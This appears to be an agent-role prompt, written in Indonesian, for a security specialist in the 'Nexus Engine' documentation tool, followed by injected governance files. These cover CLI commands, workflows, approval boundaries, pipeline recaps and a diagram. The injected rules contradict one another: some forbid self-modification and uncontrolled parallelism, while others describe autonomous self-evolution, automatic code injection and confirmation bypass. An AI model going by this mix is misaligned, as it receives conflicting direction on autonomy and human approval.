# ROLE: CYBER SECURITY SPECIALIST (Internal)

Anda adalah spesialis keamanan internal Nexus Engine.

## Otoritas CRUD
- **C/R**: YES
- **U/D**: NO

## Fokus
- Enkripsi, sanitasi data, dan keamanan repository.
- Mendeteksi kebocoran kredensial dan celah keamanan sistem.

## 🏛️ NEXUS GOVERNANCE & HARD BOUNDARIES (Institutionalized)
> Pengetahuan ini diinjeksikan secara otomatis dari folder nexus_rules untuk memastikan kepatuhan agen.



### 📜 RULE: BASH_COMMANDS.md
# 🐧 Nexus Engine: Bash Command Guide

Panduan ini ditujukan bagi pengembang yang menggunakan lingkungan **Bash** (Linux, macOS, atau Git Bash di Windows) untuk berinteraksi dengan Nexus Engine.

## 🚀 Perintah Dasar (Standard SDLC)

Gunakan perintah ini untuk menjalankan siklus pengembangan standar.

```bash
# Menjalankan siklus penuh (Audit -> Plan -> Execute)
nexus run

# Atau via npx (Jika belum terinstall secara global/alias)
npx github:Faisal-Trainer/Human-AI-Nexus nexus run

# Menjalankan Audit saja
nexus audit

# Sangat berguna untuk CI/CD atau script otomatis
nexus run --yes

# Memilih mode audit secara eksplisit
nexus run --mode learning    # Laporan detail untuk belajar
nexus run --mode efficient   # Laporan ringkas untuk senior
```

## 🌾 Protokol Intelijen (Harvesting & Sync)

Gunakan perintah ini untuk memindahkan pengetahuan antar proyek.

```bash
# 1. Harvest: Ambil dokumen Nexus dari proyek lain
nexus harvest "/path/to/other/project"

# 2. Refactor: Masukkan hasil harvest (Golden) ke HUB Pusat (memory/long_term/)
nexus refactor

# 3. Update: Sinkronkan pengetahuan HUB ke dalam keahlian Agent (skill/)
nexus update-skills
```

## 🛠️ Manajemen Framework

```bash
# Melihat daftar seluruh keahlian (Skill) Agent yang tersedia
nexus skills

# Menampilkan bantuan (Help)
nexus help

# Melepas (Uninstall) Brain Nexus dari proyek (Dokumentasi tetap terjaga)
nexus dell
```

## 🚩 Parameter & Flags

| Flag            | Deskripsi                             | Contoh            |
| :-------------- | :------------------------------------ | :---------------- |
| `--mode` / `-m` | Mode audit (`learning` / `efficient`) | `-m efficient`    |
| `--root` / `-r` | Target direktori proyek               | `-r ./my-project` |
| `--yes` / `-y`  | Bypass konfirmasi manual              | `--yes`           |

---

_Verified by Nexus Orchestrator | Last Update: April 2026_

---


### 📜 RULE: DEV_COMMANDS.md
# 🛡️ Nexus Engine: Developer Quick Start & Commands

Panduan ini dirancang khusus untuk tim pengembang yang bekerja langsung di dalam repositori **NEXUS AI** atau ingin mengintegrasikan engine ke dalam alur kerja lokal mereka.

## ⚙️ Metode Eksekusi Lokal (Node CLI)

Jika perintah `nexus` global bermasalah (misal: `MODULE_NOT_FOUND`), gunakan eksekusi `node` secara langsung dari folder root engine.

### 1. Siklus Standar (SDLC)
```powershell
# Menjalankan siklus penuh (Audit -> Plan -> Execute)
nexus run

# Menjalankan Audit saja
nexus audit

# Menjalankan mode otomatis (tanpa konfirmasi manual)
nexus run --yes
```

### 2. Protokol Intelijen (Harvesting)
Gunakan untuk menyerap dokumentasi dari proyek lain ke dalam repositori pusat ini.
```powershell
# Harvest dari proyek target (gunakan path absolut)
nexus harvest "C:/xampp/htdocumentation/docs/NAMA_PROYEK"
```

### 3. Protokol Sinkronisasi (Mass Refactor & Update)
Setelah melakukan harvest, jalankan dua protokol ini untuk mengupdate HUB dan Skills Agent.
```powershell
# Protocol 1: Golden -> HUB (memory/long_term/)
nexus refactor

# Protocol 2: HUB -> Skills (skill/)
nexus update-skills
```

### 4. Manajemen & Bantuan
```powershell
# Melihat daftar seluruh keahlian (Skill) Agent yang tersedia
nexus skills

# Menampilkan bantuan (Help)
nexus help

# Melepas (Uninstall) Brain Nexus dari proyek
nexus dell
```

---

## 🚩 Parameter & Flags Tambahan

| Flag | Pilihan | Deskripsi |
| :--- | :--- | :--- |
| `--mode` / `-m` | `learning` \| `efficient` | `learning` (default) untuk edukasi, `efficient` untuk kecepatan. |
| `--root` / `-r` | `[path]` | Menentukan direktori target untuk audit/eksekusi. |
| `--yes` / `-y` | *(Boolean)* | Bypass persetujuan manual (Gunakan dengan hati-hati). |

---

## 🛠 Workflow Rekomendasi (The Golden Flow)

1.  **Harvest**: Ambil pengetahuan terbaru dari proyek aktif.
    `nexus harvest "C:/path/to/project"`
2.  **Refactor**: Integrasikan pengetahuan tersebut ke dalam HUB Global.
    `nexus refactor`
3.  **Update**: Sinkronkan instruksi Agent agar mereka "belajar" hal baru.
    `nexus update-skills`
4.  **Run**: Jalankan audit akhir untuk memastikan status **Zero Flaws**.
    `nexus run --yes`

---
*Status: Verified by Nexus Orchestrator | Update: 29 April 2026*

---


### 📜 RULE: INTERNAL_WORKFLOW.md
# ⚙️ Alur Kerja Tim Internal: Human-AI Nexus (Protocol v3.0 — Autonomous Evolution)

Dokumen ini mengatur protokol operasional untuk ekspansi pengetahuan, pemeliharaan sistem, dan evolusi fisik mesin Nexus AI.

---

## ⚡ 1. Protokol: "Semantic Mass Refactor" (Golden ➔ HUB)
**Deskripsi**: Integrasi pengetahuan skala besar dengan pemetaan semantik otomatis.

*   **Aktor**: `Golden Crawler` & `Memory Pipeline v3`.
*   **Algoritma Kerja**:
    1.  **Cleansing Protocol**: Deteksi dan penghapusan data sensitif (API Keys, IP) secara otomatis.
    2.  **Semantic Tagging**: Memberikan label `[tag]` dinamis berdasarkan analisis konten.
    3.  **Semantic Linking**: Menghubungkan konsep antar dokumen secara otomatis di dalam HUB.

---

## ⚡ 2. Protokol: "Semantic Mass Update" (HUB ➔ Skill)
**Deskripsi**: Transformasi standar HUB menjadi keahlian agen berbasis distribusi semantik (Cross-Pollination).

*   **Aktor**: `Nexus Guru` & `Nexus Engine v3`.
*   **Algoritma Kerja**:
    1.  **Tag-Based Distribution**: Pengetahuan didistribusikan ke file `.md` di folder `workflow/` berdasarkan kesesuaian Tag Semantik.
    2.  **Cross-Pollination**: Satu sumber pengetahuan dapat memperbarui banyak kategori skill secara paralel.
    3.  **Contextual Wisdom**: Mengutamakan injeksi "Actionable Wisdom" (instruksi operasional) daripada teks mentah.

---

## ⚡ 3. Protokol: "Machine Forging" (Wisdom ➔ Code)
**Deskripsi**: Pembangunan mesin (tools) baru secara fisik berdasarkan pengetahuan yang dipelajari sistem.

*   **Trigger**: Penemuan standar teknis baru di HUB yang memerlukan pemantauan otomatis.
*   **Aktor**: `Machinist Forge`.
*   **Algoritma Kerja**:
    1.  **Wisdom Extraction**: Mengekstrak aturan teknis dari dokumen HUB terdistilasi.
    2.  **Physical Scaffolding**: Membuat file `.js` baru di `agent/tools/scanners/` berdasarkan template Nexus.
    3.  **Auto-Registration**: Mendaftarkan mesin baru ke dalam siklus audit Engine tanpa modifikasi manual.

---

## ⚡ 4. Protokol: "Plugin-Based Audit" (Autonomous Scanners)
**Deskripsi**: Pemanfaatan ekosistem mesin (scanners) yang bersifat dinamis dan dapat diperluas.

*   **Aktor**: `Nexus Engine` & `Dynamic Scanners Pool`.
*   **Algoritma Kerja**:
    1.  **Dynamic Discovery**: Engine memindai folder `scanners/` untuk menemukan seluruh modul audit yang aktif.
    2.  **Parallel Execution**: Menjalankan seluruh mesin (Core + Forged) secara paralel untuk mencari anomali sistem.

---

## ⚡ 5. Protokol: "Ecosystem Synchronization"
**Deskripsi**: Sinkronisasi dokumentasi publik (README, dsb) untuk mencerminkan status evolusi terbaru.

---
*Status: Protokol v3.0 Aktif (Autonomous Evolution)*
*Target: Zero Flaws & Physical Self-Evolution*

---


### 📜 RULE: NEXUS INTERNAL CORE — HARD BOUNDARY & SYSTEM CONSTRAINT.md
# NEXUS INTERNAL CORE — HARD BOUNDARY & SYSTEM CONSTRAINT

## ⚠️ PURPOSE (INTERNAL CORE ONLY)

NEXUS Internal Core adalah:

> **Deterministic Knowledge Operating System berbasis dokumentasi**

Fungsi utamanya:

- memproses pengetahuan dari dokumentasi
- menjaga konsistensi struktur pengetahuan
- menjalankan pipeline evolusi pengetahuan secara terkendali

**Bukan:**

- AI system
- reasoning engine bebas
- self-learning system
- autonomous decision maker

---

## 🔒 CORE PHILOSOPHY (WAJIB DIKUNCI)

1. **Deterministic over Adaptive**
2. **Structure over Intelligence**
3. **Explicit Rules over Implicit Behavior**
4. **Controlled Evolution over Self-Evolution**
5. **State Machine over Dynamic Flow**

---

## 🧱 SYSTEM MODEL (WAJIB)

Internal Core HARUS direpresentasikan sebagai:

> **State-Driven Knowledge Pipeline Engine**

Dengan lifecycle tetap:

```text
INIT → AUDIT → PLAN → EXECUTE → VERIFY → RECORD → DISTILL
```

❗ Urutan ini **tidak boleh diubah secara dinamis**

---

## 🔒 HARD BOUNDARY (PAGAR INTERNAL)

### 1. NO AI / NO PROBABILISTIC SYSTEM

Internal Core:

- ❌ Tidak boleh menggunakan LLM
- ❌ Tidak boleh menggunakan ML
- ❌ Tidak boleh ada probabilistic decision

Semua keputusan:

> ✔ Rule-based
> ✔ Fully predictable
> ✔ Reproducible

---

### 2. NO SELF-EVOLUTION

Walaupun ada:

- `Machinist`
- `Update Engine`

Dibatasi keras:

❌ Dilarang:

- mengubah dirinya sendiri tanpa rule eksplisit
- membuat logic baru secara otomatis
- menambah pipeline stage baru secara dinamis

✔ Diperbolehkan:

- modifikasi berbasis rule statis
- injeksi terkontrol dengan validasi ketat

---

### 3. NO UNSTRUCTURED DATA FLOW

Semua data HARUS:

- memiliki struktur formal
- tervalidasi oleh kontrak

❌ Dilarang:

- manipulasi string bebas
- parsing tanpa schema
- operasi berbasis asumsi

---

### 4. SINGLE SOURCE OF TRUTH: INTERNAL STATE

Bukan file system.

Internal Core HARUS:

> bekerja di atas **in-memory representation**

File system hanya:

- input awal
- output akhir

❌ Dilarang:

- menjadikan file sebagai state utama
- side-effect antar stage

---

### 5. STRICT STAGE ISOLATION

Setiap stage:

- hanya menerima input
- menghasilkan output

❌ Dilarang:

- akses langsung ke stage lain
- modifikasi global state tanpa kontrol

---

## 🧠 DATA MODEL (WAJIB ADA)

Internal Core HARUS memiliki representasi formal:

```cpp
struct NexusState {
    DocumentAST ast;
    KnowledgeGraph knowledge;
    ExecutionPlan plan;
    ValidationReport report;
}
```

Semua stage hanya boleh memproses:

> **NexusState**

---

## 🔄 PIPELINE CONTRACT

Setiap stage wajib mengikuti kontrak:

```cpp
StageResult process(const NexusState& input);
```

Dengan aturan:

- tidak boleh side-effect
- tidak boleh I/O langsung
- tidak boleh skip validasi

---

## ⚙️ EXECUTION RULE

Pipeline berjalan:

```text
State(n) → Process → State(n+1)
```

❗ Tidak boleh:

- lompat stage
- eksekusi paralel tanpa kontrol deterministik
- branching liar

---

## 🧨 COLLISION LOGIC (WAJIB TERKONTROL)

Format wajib:

```text
IF {Existing} ELSE {New}
```

Aturan:

- tidak boleh overwrite langsung
- tidak boleh merge tanpa rule
- harus bisa dilacak (traceable)

---

## 🧱 MEMORY SYSTEM RULE

### HUB / Knowledge:

- harus immutable per stage
- perubahan hanya melalui pipeline

### Archive:

- write-only
- tidak boleh jadi sumber logika aktif

---

## 🚫 ANTI-SCOPE INTERNAL

Jika sistem mulai mengarah ke:

- adaptive learning
- heuristic decision making
- context guessing
- self-modifying logic tanpa kontrol

→ **HARUS DIHENTIKAN**

---

## 🧭 ENGINE CONSTRAINT

### NexusEngine:

- hanya orchestrator
- tidak boleh mengandung business logic berat

### Module:

- harus pure function oriented
- reusable
- testable

---

## 🧨 FAILURE CONDITION

Internal Core dianggap gagal jika:

- hasil tidak deterministik
- pipeline tidak bisa direplay dengan hasil sama
- state tidak bisa direkonstruksi
- terjadi side-effect antar stage
- logika tidak bisa dijelaskan secara eksplisit

---

## 🏁 FINAL STATE (INTERNAL)

Internal Core dianggap selesai jika:

- pipeline lifecycle stabil
- semua stage deterministic
- state fully traceable
- tidak ada dependency eksternal selain input/output

---

## 🔚 FINAL RULE

> Jika sebuah perubahan menambah “kecerdasan” tapi mengurangi determinisme,
> maka perubahan tersebut **HARUS DITOLAK**.

---

---


### 📜 RULE: NEXUS eksternal boundary.md
# 🧱 AI Agent Documentation System — Boundary Definition

## 1. 🎯 Tujuan Utama (Scope Inti)

Project ini berfokus pada orkestrasi perilaku AI Agent untuk:

- Membantu pembuatan dokumentasi project yang sistematis dan konsisten

AI Agent **BUKAN** untuk:

- Coding utama
- Debugging kompleks
- Deployment
- Pengambilan keputusan bisnis

> AI Agent = Documentation Assistant, bukan Developer utama

---

## 2. 🧭 Role AI Agent

AI Agent hanya boleh beroperasi dalam 4 role berikut:

### 2.1 Summarizer

- Menghasilkan ringkasan aktivitas harian
- Input: log kerja / commit / chat
- Output: ringkasan faktual, tanpa asumsi

---

### 2.2 Planner

- Menyusun roadmap dan fase pengembangan
- Harus modular dan incremental
- Tidak boleh keluar dari scope project

---

### 2.3 Auditor

- Memberikan evaluasi dan saran fitur
- Harus berbasis dokumentasi
- Tidak boleh spekulatif

---

### 2.4 Recorder

- Mencatat perubahan sebelum vs sesudah
- Mendokumentasikan hasil tiap fase
- Harus terstruktur dan dapat ditelusuri

---

## 3. 📦 Struktur Dokumentasi

Semua output wajib masuk ke kategori berikut:

### 3.1 Summary

- Aktivitas hari ini
- Masalah
- Status progress

### 3.2 Planning

- Breakdown fase
- Tujuan
- Dependensi

### 3.3 Audit

- Kekurangan
- Rekomendasi
- Saran fitur

### 3.4 Record

- Perubahan teknis
- Before vs After
- Dampak perubahan

---

## 4. 🚧 Boundary Teknis

AI Agent tidak boleh:

- Mengubah source code tanpa instruksi
- Mengambil keputusan arsitektur final
- Mengakses resource eksternal tanpa izin
- Menulis di luar 4 kategori dokumentasi
- Menghasilkan output tanpa struktur

---

## 5. ⚙️ Environment Scope

AI Agent dapat berjalan di:

- IDE (VS Code, JetBrains, dll)
- Local AI tools
- CLI / standalone AI

Namun harus:

- Konsisten role
- Konsisten format dokumentasi

---

## 6. 🧪 Standar Kualitas

Dokumentasi harus:

- Konsisten
- Tidak ambigu
- Mudah dipahami oleh orang baru
- Memiliki relasi jelas:
  Planning → Execution → Record → Audit

---

## 7. 🔁 Workflow (Updated dengan Eksekusi)

### 7.1 Base Workflow (Dengan Eksekusi)

1. Planning dibuat
2. 🔒 Minta approval
3. ✅ Planning disetujui
4. ⚙️ Eksekusi dilakukan
5. Summary dibuat
6. 🔒 Minta approval
7. Record dibuat
8. 🔒 Minta approval
9. Audit dilakukan
10. 🔒 Minta approval

---

### 7.2 Aturan Eksekusi

Eksekusi adalah tahap implementasi dari Planning yang telah disetujui.

Eksekusi dapat dilakukan oleh:

- 🤖 AI Agent (chatbot / IDE agent / local LLM)
- 👨‍💻 Developer (manual)

---

### 7.3 Constraint Eksekusi oleh AI

Jika AI Agent yang melakukan eksekusi:

- Harus berdasarkan Planning yang sudah disetujui
- Tidak boleh keluar dari scope Planning
- Tidak boleh menambahkan fitur baru tanpa approval
- Harus menghasilkan output yang bisa didokumentasikan

---

### 7.4 Constraint Eksekusi oleh Developer

Jika Developer yang melakukan eksekusi:

- Tetap wajib mengikuti Planning
- Semua perubahan harus dicatat oleh AI (Recorder)
- Tidak boleh melewati proses dokumentasi

---

### 7.5 Relasi Eksekusi → Dokumentasi

Setiap eksekusi WAJIB menghasilkan:

- Input untuk Summary
- Data untuk Record (before vs after)
- Bahan evaluasi untuk Audit

---

### 7.6 Larangan Terkait Eksekusi

- Eksekusi sebelum Planning disetujui
- Eksekusi di luar scope Planning
- Eksekusi tanpa dokumentasi
- AI melakukan aksi tanpa jejak (non-traceable action)

---

## 8. 🔒 Mandatory Approval System (Update Minor)

Tambahan aturan:

- Eksekusi **hanya boleh dimulai setelah Planning disetujui**
- Jika Planning berubah → wajib approval ulang sebelum eksekusi lanjut

### 8.1 Prinsip

Semua output AI Agent harus mendapat:

> ✅ Persetujuan eksplisit dari Developer / User

---

### 8.2 Approval Required Pada:

#### Planning

- Sebelum fase dijalankan

#### Summary

- Sebelum menjadi dokumentasi resmi

#### Audit

- Sebelum masuk ke planning

#### Record

- Sebelum menjadi state resmi

---

### 8.3 Workflow Dengan Approval

1. Planning dibuat
2. 🔒 Minta approval
3. Aktivitas dilakukan
4. Summary dibuat
5. 🔒 Minta approval
6. Record dibuat
7. 🔒 Minta approval
8. Audit dilakukan
9. 🔒 Minta approval

---

### 8.4 Format Approval Request

Setiap output harus diakhiri dengan:
STATUS: MENUNGGU PERSETUJUAN
ACTION: Approve / Revise / Reject

---

### 8.5 Larangan Terkait Approval

AI Agent tidak boleh:

- Menganggap diam sebagai persetujuan
- Melanjutkan tanpa approval
- Mengubah hasil yang sudah disetujui tanpa approval ulang
- Menggabungkan approval dalam satu langkah

---

## 9. 🧠 Constraint Perilaku AI

AI harus:

- Deterministik
- Berbasis data
- Ringkas dan jelas
- Konsisten format

---

## 10. 📌 Definition of Done

Project dianggap selesai jika:

- Semua aktivitas terdokumentasi dalam 4 kategori
- AI dapat menghasilkan dokumentasi otomatis
- Dokumentasi bisa digunakan untuk:
  - Onboarding
  - Audit
  - Evaluasi project

---

## 11. 🔒 Boundary Final

> Sistem ini adalah pembatas AI Agent agar menjadi mesin dokumentasi yang terstruktur, konsisten, dan dikontrol penuh oleh manusia.

Bukan:

> Sistem untuk menggantikan developer atau membangun produk utama

---


### 📜 RULE: NEXUS_EXTERNAL_PIPELINE_RECAP.md
# 🌐 Rekapitulasi Pipeline Eksternal Nexus AI (Ecosystem Integration)

Dokumen ini menjelaskan alur kerja Nexus AI saat berinteraksi dengan proyek eksternal (Local Development). Ini adalah jembatan antara **Engine Pusat** dan **Implementasi Proyek Spesifik**.

---

## 🔗 1. Global CLI Interaction (Bridge Protocol)
Nexus AI beroperasi sebagai perintah global yang terhubung secara dinamis ke kode sumber utama melalui protokol linking.

**Alur Kerja:**
1.  **Engine Linking**: Menggunakan `npm link` di folder pusat (`NEXUS AI`) untuk mendaftarkan command `nexus` secara global.
2.  **Project Integration**: Menggunakan `npm link human-ai-nexus` di folder proyek target (seperti F-Novel) untuk menggunakan versi pengembangan terbaru secara real-time.
3.  **Dynamic Execution**: Command `nexus run` secara otomatis mendeteksi root project dan menyesuaikan perilaku berdasarkan struktur folder yang ditemukan.

---

## 🔍 2. Specialist Audit (External Scan)
Saat fase Audit dimulai pada proyek eksternal, Engine mengerahkan Agent Spesialis untuk melakukan pemindaian mendalam.

**Komponen Utama:**
-   **Cyber Security**: Memeriksa kebocoran `.env`, kerentanan autentikasi, dan konfigurasi keamanan.
-   **UX Engineer**: Memastikan konsistensi desain, penggunaan variabel CSS/Tailwind, dan estetika premium.
-   **SEO & Performance**: Audit WebP, optimasi query database, dan skor aksesibilitas.
-   **VCS Architect**: Menjaga kesehatan repository, `.gitignore`, dan alur branching.

---

## 🛡️ 3. TDD Iron Laws Enforcement (External Guard)
Nexus AI memaksakan standar kualitas tinggi pada proyek eksternal melalui `TDDGuard`.

**Protokol Keamanan:**
-   **Test-Required Modification**: Setiap perubahan pada kode produksi WAJIB memiliki test pendukung.
-   **Exemption Management**: Jika test belum tersedia, file target harus didaftarkan di `TDD_LIST.md` atau `documentation/planning/TDD_LIST.md` agar Engine diizinkan melakukan modifikasi fisik.
-   **Violation Block**: Engine akan menghentikan eksekusi secara otomatis jika mendeteksi modifikasi pada file tanpa bukti perencanaan TDD.

**Agent Pendukung:**
-   **TDD Guard Agent**: [tdd-guard.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/agent/external/engineering/tdd-guard.md) — Bertugas mengelola daftar pengecualian dan memastikan kepatuhan hukum TDD.

---

## 🛠️ 4. External Path Awareness (Structure Detection)
Nexus AI didesain untuk mengenali berbagai struktur proyek secara cerdas.

**Prioritas Deteksi Folder:**
1.  **Documentation-First**: Mencari folder `documentation/` di root proyek untuk menyimpan audit, planning, dan knowledge.
2.  **Nexus-Embedded**: Mencari folder `nexus/` jika folder dokumentasi tidak ditemukan.
3.  **Root-Fallback**: Jika keduanya tidak ada, Engine akan beroperasi langsung di root folder namun memberikan peringatan untuk standarisasi.

---

## 📋 5. Implementation Planning & Auto-Fix
Engine tidak hanya menemukan masalah, tetapi juga merencanakan dan mengeksekusi solusi.

**Proses:**
1.  **Plan Generation**: Membuat file `PLAN-*.json` dan `.md` yang berisi daftar tugas terperinci.
2.  **Auto-Action Injection**: Tugas tertentu (seperti mengamankan `.env`) secara otomatis disuntikkan dengan aksi fisik (`FILE_APPEND`, `FILE_REPLACE`).
3.  **Atomic Execution**: Menggunakan `Modifier.js` untuk menerapkan perubahan langsung ke file proyek eksternal setelah lolos verifikasi TDD.

---

## 🧐 Analisis Integrasi Eksternal

### Kekuatan Saat Ini:
-   **Zero-Config Detection**: Engine sangat fleksibel dalam mengenali struktur folder proyek yang berbeda.
-   **Real-time Development**: Berkat `npm link`, setiap pembaruan logika di Engine pusat langsung tersedia di seluruh proyek yang terhubung.
-   **Compliance-First**: TDD Guard memastikan pengembang (dan AI) tidak melakukan perubahan sembarangan.

### Rekomendasi (External Roadmap):
1.  **Remote Harvesting**: Mengembangkan kemampuan untuk memanen pengetahuan dari repository remote tanpa harus melakukan cloning lokal.
2.  **External Skill Injection**: Memungkinkan proyek eksternal memiliki "Custom Skills" yang hanya berlaku untuk proyek tersebut namun tetap dikelola oleh Orchestrator pusat.

---
## 🚀 6. External Pipeline Roadmap (Future Optimizations)
Kelima pilar optimasi saat ini berada dalam fase perencanaan:
1.  **TDD Scaffolding**: [Planning] Otomatisasi pembuatan test.
2.  **Lainnya**: Skill Injection, Atomic Rollback, Knowledge Distillation, & Shadow Audit.
Detail lengkap di [EXTERNAL_PIPELINE_ROADMAP.md](file:///c:/Users/ACER/Desktop/NEXUS%20AI/documentation/planning/EXTERNAL_PIPELINE_ROADMAP.md).

---
*Generated by Nexus AI | Status: TDD_LAB_FOCUS | Date: 2026-05-01*

---


### 📜 RULE: NEXUS_INTERNAL_PIPELINE_RECAP.md
# 🏗️ Rekapitulasi Pipeline Internal Nexus AI (Orchestrator)

Dokumen ini menjelaskan alur kerja internal dari folder `agent/core/` untuk memberikan pemahaman menyeluruh tentang bagaimana Nexus AI mengelola data, memori, dan eksekusi.

---

## 🚀 1. NexusEngine: Sang Konduktor Utama (Autonomous Edition)

`NexusEngine.js` adalah pusat kendali yang kini beroperasi dengan tingkat otonomi tinggi.

**Alur Kerja Utama:**

1.  **INIT**: Inisialisasi jalur secara dinamis dengan dukungan penuh terhadap struktur `memory/long_term` & `memory/short_term`.
2.  **PARALLEL AUDIT**: Menjalankan auditor spesialis secara paralel (`Promise.all`), memangkas waktu pemindaian secara drastis.
3.  **SEMANTIC SEARCH**: Mencari pengetahuan di HUB menggunakan metadata/tags untuk akurasi yang lebih tinggi.
4.  **PLAN**: Mengubah temuan audit menjadi tugas (tasks) yang terukur.
5.  **AUTONOMOUS EXECUTE**: Menjalankan perubahan fisik dengan **TDD Scaffolding** otomatis (jika test belum ada) dan **Self-Healing Logs**.
6.  **VERIFY**: Validasi deterministik terhadap setiap tindakan yang telah dieksekusi.
7.  **RECORD**: Pengarsipan sesi dan sinkronisasi log pemulihan mandiri ke dokumen RECAP.

---

## 🧪 2. Distiller: Sang Editor HUB (Intelligent Edition)

`Distiller.js` kini berfungsi sebagai mesin intelijen yang mengelola keterkaitan antar pengetahuan.

**Fungsi:**

- **Advanced Extraction**: Mengekstraksi bagian *Insights* dan *Recommendations* secara cerdas dari dokumen mentah.
- **Semantic Tagging**: Menambahkan metadata domain (Security, UI-UX, TDD, dll) secara otomatis ke setiap file HUB.
- **Semantic Cross-Linking**: Menciptakan tautan (link) otomatis antar dokumen yang memiliki keterkaitan konsep teknis.
- **Standardization**: Menyeragamkan seluruh nama file di HUB dengan pola `NEXUS_...` menggunakan protokol **Multi-Option Merge**.

---

## 🧠 3. MemoryPipeline: Sang Pengumpul Harvest

`MemoryPipeline.js` kini berfokus pada penarikan data dari dunia luar (proyek-proyek audit).

**Fungsi:**

- **Harvest Ingestion**: Mengambil data pengetahuan dari folder `golden/harvest/` dan memasukkannya ke dalam HUB (`memory/long_term/`).
- **Archiving**: Memindahkan file-file audit/planning yang sudah selesai ke dalam `NEXUS_SESSION_HISTORY_ARCHIVE.MD` untuk menjaga kapasitas disk.

---

## 🦾 4. Machinist: Mesin Evolusi Core (Upgraded)

`Machinist.js` memungkinkan Nexus AI untuk tumbuh secara dinamis dengan kecerdasan folder.

**Fungsi:**

- **Smart Auto-Integration**: Mendeteksi folder (`orchestrator`/`auditor`) secara otomatis dan melakukan injeksi kode yang aman ke dalam `NexusEngine.js` tanpa merusak struktur yang ada.

---

## 🛠️ 5. Logika Pendukung (The Muscles) (Upgraded)

Tiga komponen ini adalah "otot" yang menjalankan perintah teknis dengan presisi tinggi:

1.  **Modifier.js**: Kini mendukung **Multi-Option Resolution Automation**. Selain Batch Operations, ia mampu secara otomatis memecah blok Opsi A/B menjadi kode final berdasarkan input sistem.
2.  **Contract.js**: Dilengkapi dengan **Validation Guard**. Menjamin setiap data yang lewat memenuhi kontrak interface agar sistem tetap deterministik dan aman.
3.  **WorktreeManager.js**: Mendukung **Auto-Merge & Cleanup**. Mengelola isolasi fitur dari pembuatan hingga penggabungan kembali ke cabang utama secara otomatis.

---

## 🧐 Analisis & Rekomendasi Penyempurnaan

### Yang Sudah Sangat Kuat:

- **Separation of Concerns**: Pemisahan antara Auditor (External) dan Orchestrator (Internal) sudah sangat jelas.
- **Resilience**: Penggunaan `fs-extra` dan penanganan error yang baik di setiap modul.
- **Standardization**: Pola penamaan `NEXUS_` memberikan struktur yang sangat profesional.

### ✅ Yang Telah Berhasil Disempurnakan (Final State):

- **Parallel Specialist Audit**: `NexusEngine` menjalankan auditor secara paralel (Promise.all), meningkatkan kecepatan audit hingga 70%.
- **Multi-Option Collision Protocol**: Sistem Opsi A/B telah menggantikan logika IF-ELSE di seluruh engine, memberikan fleksibilitas keputusan yang maksimal.
- **Advanced Distillation Engine**: `Distiller.js` kini mampu melakukan ekstraksi bagian dokumen (Insights/Recommendations) dan penyematan *Contextual Anchors* secara cerdas.
- **Semantic Knowledge Indexing**: Sistem kini memiliki kemampuan **Semantic Search** berdasarkan tagging otomatis (Security, UI-UX, dll) untuk pemanggilan pengetahuan yang akurat.
- **Collision Resolution Automation**: `Modifier.js` telah mendukung resolusi otomatis blok Opsi A/B menjadi kode final.
- **Autonomous TDD Scaffolding (Phase 4)**: `NexusEngine` secara otomatis men-generate boilerplate test case (JS/PHP) saat mendeteksi pelanggaran TDD.
- **Semantic Cross-Linking (Phase 4)**: `Distiller.js` kini otomatis menautkan (link) kata kunci teknis antar dokumen di HUB, menciptakan jaring pengetahuan yang solid.
- **Self-Healing Documentation (Phase 4)**: Sistem secara otomatis mencatat log pemulihan mandiri ke dalam dokumen RECAP setiap kali terjadi resolusi benturan.

### 🚀 Roadmap Masa Depan (The Next Frontier):

#### ⚡ Phase 5: Predictive Analytics & High-Performance Core
1.  **Predictive Technical Debt Analyzer**: Spesialis auditor baru yang mampu memprediksi akumulasi hutang teknis berdasarkan frekuensi modifikasi file dan kompleksitas kode.
2.  **C++ Native Distillation Core**: Migrasi modul penyulingan (Distiller) ke C++ untuk pemrosesan dataset pengetahuan skala besar dengan kecepatan native.
3.  **Visual Audit Integration**: Kemampuan auditor untuk melakukan validasi visual terhadap UI/UX berdasarkan pedoman desain yang tersimpan di HUB.

#### 🛡️ Phase 6: Security & Intelligence Optimization
1.  **Nexus Redactor (Privacy Guard)**: Implementasi filter sensor data sensitif untuk mencegah kebocoran API Keys/Secrets ke dalam memori HUB.
2.  **Cognitive Feedback Loop**: Mekanisme belajar dari kegagalan verifikasi masa lalu (Anti-Patterns) untuk meningkatkan akurasi perencanaan.
3.  **Project Namespace Isolation**: Isolasi pengetahuan antar proyek untuk mencegah kontaminasi standar.
4.  **Hot Memory Indexing**: Prioritas konteks pada temuan audit terbaru untuk respon mesin yang lebih relevan.

*Detail rencana eksekusi: [NEXUS_PIPELINE_OPTIMIZATION_PLAN.md](../planning/NEXUS_PIPELINE_OPTIMIZATION_PLAN.md)*

---
*Generated by Nexus AI | Document Status: ARCHITECT_STRATEGY_LOCKED*

---


### 📜 RULE: PIPELINE_VISUAL.md
# 📊 Visualisasi Pipeline NEXUS AI

Dokumen ini berisi representasi visual dan penjelasan mendalam mengenai alur kerja **Nexus Engine** dalam mengelola kolaborasi Human-AI.

---

## 🗺️ Diagram Alur Pipeline

```mermaid
graph TD
    %% Entry Point
    Start((Start: nexus run)) --> Init[Phase 0: Inisialisasi]
    
    subgraph "Core Engine Loop"
        Init --> Discover[Discover Agents & Skills]
        Discover --> Audit{Phase 1: Audit}
        
        %% Audit Branching
        Audit -- Mode 1: Learning --> SpecAudit[Specialist Agents Scan<br/>Security, UX, SEO, DB]
        Audit -- Mode 2: Efficient --> QuickAudit[Quick Consolidated Scan]
        
        SpecAudit --> AuditRep[Generate Audit Report]
        QuickAudit --> AuditRep
        
        AuditRep --> Plan[Phase 2: Planning]
        Plan --> PlanMD[Generate Implementation Plan<br/>documentation/planning/*.md]
        
        %% Human Intervention
        PlanMD --> Approval{Human Approval?}
        Approval -- No --> PlanMD
        Approval -- Yes / OKE --> Exec[Phase 3: Execution]
        
        %% Execution to Verification
        Exec --> Verify{Phase 4: Verification}
        Verify -- Flaws Found --> Audit
        Verify -- Zero Flaws --> Record[Phase 5: Finalization]
    end
    
    %% Finalization to Memory
    Record --> Summary[Generate Cycle Summary]
    Summary --> Knowledge[(Knowledge Base / HUB)]
    Knowledge --> End((Cycle Complete))

    %% Global Assets
    subgraph "The Brain (Resources)"
        Skill[(Skill Library)] -.-> SpecAudit
        Skill -.-> Exec
        Agent[(Agent Library)] -.-> SpecAudit
        Agent -.-> Plan
    end
    
    %% Harvesting Phase (External)
    Harvest((Phase 6: Harvest)) -.-> |Sync Knowledge| Knowledge
```

---

